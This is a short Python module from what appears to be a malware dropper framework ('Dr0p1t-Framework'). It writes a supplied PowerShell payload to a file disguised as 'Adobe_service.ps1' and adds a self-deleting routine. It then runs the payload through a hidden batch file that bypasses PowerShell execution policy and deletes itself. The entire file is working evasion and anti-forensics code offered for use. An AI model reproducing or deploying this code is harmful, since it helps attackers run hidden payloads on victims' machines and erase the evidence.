#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This module aims to run powershell scripts (ps1) and bypass execution policy
#Start

def F4533(tobe):
	f = open("Adobe_service.ps1","w")
	f.write(tobe)
	f.write("\nfunction SelfDestruct() {"+"\n")
	f.write("$path = (Get-Variable MyInvocation -Scope 1).Value.MyCommand.Path"+"\n")
	f.write("Clear-Content $path"+"\n")
	f.write("Remove-Item $path}"+"\n")
	f.write("SelfDestruct"+"\n")
	f.close()
	bypass_pol1cy()

def bypass_pol1cy():
	code	= "PowerShell.exe -ExecutionPolicy Bypass -noprofile -File Adobe_service.ps1 >> NUL"+"\n"
	code   += 'break>SomeShit.bat >> NUL && DEL SomeShit.bat >> NUL'
	fmain 	= open("SomeShit.bat","w")
	fmain.write(code)
	fmain.close()
	shityshit = subprocess.Popen( "SomeShit.bat >> NUL" ,creationflags=subprocess.CREATE_NEW_CONSOLE , shell=True)

F4533(Ps1_Script_Data)
